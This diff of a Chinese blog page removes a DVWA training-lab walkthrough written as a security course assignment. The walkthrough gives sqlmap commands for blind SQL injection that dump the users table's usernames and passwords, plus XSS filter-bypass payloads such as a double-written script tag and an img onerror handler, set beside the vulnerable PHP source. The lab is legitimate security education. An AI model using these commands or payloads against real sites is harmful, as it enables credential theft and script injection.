-<p>输入命令 <code>sqlmap -u&quot;http://b48b7cef-12e4-4de4-83fd-4bd2fecbc8f0.node3.buuoj.cn/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=kl9numacbefbi9hlmnjb6e27u4; security=low&quot; -D dvwa --tables</code>可以获得表名</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213112159694.png" alt="image-20201213112159694"></p>
-<p>输入命令<code>sqlmap -u&quot;http://b48b7cef-12e4-4de4-83fd-4bd2fecbc8f0.node3.buuoj.cn/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=kl9numacbefbi9hlmnjb6e27u4; security=low&quot; -D dvwa -T users --columns</code>可以得到user表的列名。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213113802553.png" alt="image-20201213113802553"></p>
-<p>输入命令<code>sqlmap -u&quot;http://b48b7cef-12e4-4de4-83fd-4bd2fecbc8f0.node3.buuoj.cn/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=kl9numacbefbi9hlmnjb6e27u4; security=low&quot; -D dvwa -T users -C user,password --dump</code>可以获得user表中的user和password数据。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213114136146.png" alt="image-20201213114136146"></p>
-<ol start="2">
-<li><strong>安全级别medium</strong></li>
-</ol>
-<p>和sql注入一样，使用了下拉的方式限制输入。仍然可以使用抓包的方式手动更改。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213150344031.png" alt="image-20201213150344031"></p>
-<p>和low的类似，仍可以使用sqlmap进行注入。只需要使用到data参数。</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">–-data</span><br><span class="line">data后面的数据是以POST方式提交，sqlmap会像检测GET参数一样检测POST提交过去的参数</span><br></pre></td></tr></table></figure>
-
-<p>为了节约时间，把参数设置更为详细<code>--dbms=mysql</code> 指定目标数据库类型；<code>--technique=B</code> 指定所使用的技术，这里设为布尔盲注；</p>
-<p>输入命令<code>sqlmap -u&quot;http://59b24e47-2681-4b1b-bd53-71d3cdb26f72.node3.buuoj.cn/vulnerabilities/sqli_blind/#&quot; --cookie=&quot;PHPSESSID=9a1gmnli2mf556hdc3jhhq23s3; security=medium&quot; --data=&quot;id=1&amp;Submit=Submit&quot;  --dbms=MySQL --technique=B --dbs</code>获得数据库名称。</p>
-<p><strong><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213153314559.png" alt="image-20201213153314559"></strong></p>
-<p>输入命令<code>sqlmap -u&quot;http://59b24e47-2681-4b1b-bd53-71d3cdb26f72.node3.buuoj.cn/vulnerabilities/sqli_blind/#&quot; --cookie=&quot;PHPSESSID=9a1gmnli2mf556hdc3jhhq23s3; security=medium&quot; --data=&quot;id=1&amp;Submit=Submit&quot;  --dbms=MySQL --technique=B -D dvwa --tables</code>获得表名。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213153433823.png" alt="image-20201213153433823"></p>
-<p>输入命令<code>sqlmap -u&quot;http://59b24e47-2681-4b1b-bd53-71d3cdb26f72.node3.buuoj.cn/vulnerabilities/sqli_blind/#&quot; --cookie=&quot;PHPSESSID=9a1gmnli2mf556hdc3jhhq23s3; security=medium&quot; --data=&quot;id=1&amp;Submit=Submit&quot;  --dbms=MySQL --technique=B -D dvwa -T users --columns</code></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213153632539.png" alt="image-20201213153632539"></p>
-<p>输入命令，<code>sqlmap -u&quot;http://59b24e47-2681-4b1b-bd53-71d3cdb26f72.node3.buuoj.cn/vulnerabilities/sqli_blind/#&quot; --cookie=&quot;PHPSESSID=9a1gmnli2mf556hdc3jhhq23s3; security=medium&quot; --data=&quot;id=1&amp;Submit=Submit&quot;  --dbms=MySQL --technique=B -D dvwa -T users -C user,password --dump</code>获得表中的数据</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213154037652.png" alt="image-20201213154037652"></p>
-<ol start="3">
-<li><strong>安全级别high</strong></li>
-</ol>
-<p>源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>发现是从cookie中读取id的值的。同时查询页面和结果页面不是同一个，可以有效防止sqlmap。但是，这里并不需要在查询页面输入，确定注入点在cookie一样可以用sqlmap。</p>
-<p>输入命令<code>sqlmap -u&quot;http://59b24e47-2681-4b1b-bd53-71d3cdb26f72.node3.buuoj.cn/vulnerabilities/sqli_blind/&quot; --cookie=&quot;id=1*;PHPSESSID=9a1gmnli2mf556hdc3jhhq23s3; security=high&quot; --dbms=MySQL --technique=B --dbs</code></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213162740452.png" alt="image-20201213162740452"></p>
-<p>其他过程与medium一致。</p>
-<h3 id="XSS（Stored）"><a href="#XSS（Stored）" class="headerlink" title="XSS（Stored）"></a>XSS（Stored）</h3><ol>
-<li><strong>安全级别low</strong></li>
-</ol>
-<p>服务器段的核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>	</span><br></pre></td></tr></table></figure>
-
-<p>相关的函数说明：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">trim(string,charlist)</span><br><span class="line"></span><br><span class="line">函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string(string,connection)</span><br><span class="line"></span><br><span class="line">函数会对字符串中的特殊符号（\x00，\n，\r，\，&#39;，&quot;，\x1a）进行转义。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stripslashes(string)</span><br><span class="line"></span><br><span class="line">函数删除字符串中的反斜杠</span><br></pre></td></tr></table></figure>
-
-<p>可以发现，并没有对输入做xss方面的过滤，而且会将输入存储在数据库中，因此显然存在存储型XSS漏洞。</p>
-<p>接下来进行利用：</p>
-<p>在message栏中输入<code>&lt;script&gt;alert(/message/)&lt;/script&gt;</code>，成功弹出弹窗。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213104232210.png" alt="image-20201213104232210"></p>
-<p>在name栏发现，前端进行了字数限制，所以通过burp抓包修改。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213104440053.png" alt="image-20201213104440053"></p>
-<p>成功得到弹窗。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213104500740.png" alt="image-20201213104500740"></p>
-<ol start="2">
-<li><strong>安全级别medium</strong></li>
-</ol>
-<p>服务器端代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>相关函数说明：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用&lt;b&gt;标签。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</span><br></pre></td></tr></table></figure>
-
-<p>可以发现对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<code>&lt;script&gt;</code>字符串，仍然存在存储型的XSS。</p>
-<p>漏洞利用：</p>
-<p>双写绕过，抓包改name参数为<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code>.成功得到弹窗。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213152350020.png" alt="image-20201213152350020"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213152417164.png" alt="image-20201213152417164"></p>
-<ol start="3">
-<li>high</li>
-</ol>
-<p>查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>可以看出，和medium比起来，这一次是使用正则表达式过滤了<code>&lt;script&gt;</code>，但是忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。</p>
-<p>抓包将那么参数改为<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>,成功得到弹窗。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213163452272.png" alt="image-20201213163452272"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213163522302.png" alt="image-20201213163522302"></p>
-<h3 id="XSS（Reflected）"><a href="#XSS（Reflected）" class="headerlink" title="XSS（Reflected）"></a>XSS（Reflected）</h3><ol>
-<li><strong>安全级别low</strong></li>
-</ol>
-<p>服务器端代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>可以看到，是直接引用那么参数，没有任何过滤。</p>
-<p>所以输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>就可以得到哦弹窗。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213104830583.png" alt="image-20201213104830583"></p>
-<ol start="2">
-<li><strong>安全级别medium</strong></li>
-</ol>
-<p>服务器端的代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>显然，这里利用基于黑名单的思想，将<code>&lt;script&gt;</code>删除。可以简单利用双写绕过。</p>
-<p>输入<code>&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;</code>就可以成功得到弹窗。 </p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213152657529.png" alt="image-20201213152657529"></p>
-<ol start="3">
-<li><strong>安全级别high</strong></li>
-</ol>
-<p>查看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> 	</span><br></pre></td></tr></table></figure>
-
-<p>和存储型的xss一样，这里也是使用正则表达式过滤了<code>&lt;script&gt;</code>，可以使用img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p>
-<p>输入<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>，成功得到弹窗。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213163829420.png" alt="image-20201213163829420"></p>
-
+          <p>网络安全课程作业</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/e492a0d/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1224,7 +496,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/0/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/5600bec/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1238,7 +510,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/posts/0/" class="post-title-link" itemprop="url">未命名</a>
+            <a href="/posts/5600bec/" class="post-title-link" itemprop="url">攻防世界pwn进阶</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1256,8 +528,17 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-02-01 16:20:28" itemprop="dateModified" datetime="2021-02-01T16:20:28+08:00">2021-02-01</time>
+        <time title="修改时间：2021-02-01 17:09:28" itemprop="dateModified" datetime="2021-02-01T17:09:28+08:00">2021-02-01</time>
       </span>
+    <span class="post-meta-item">
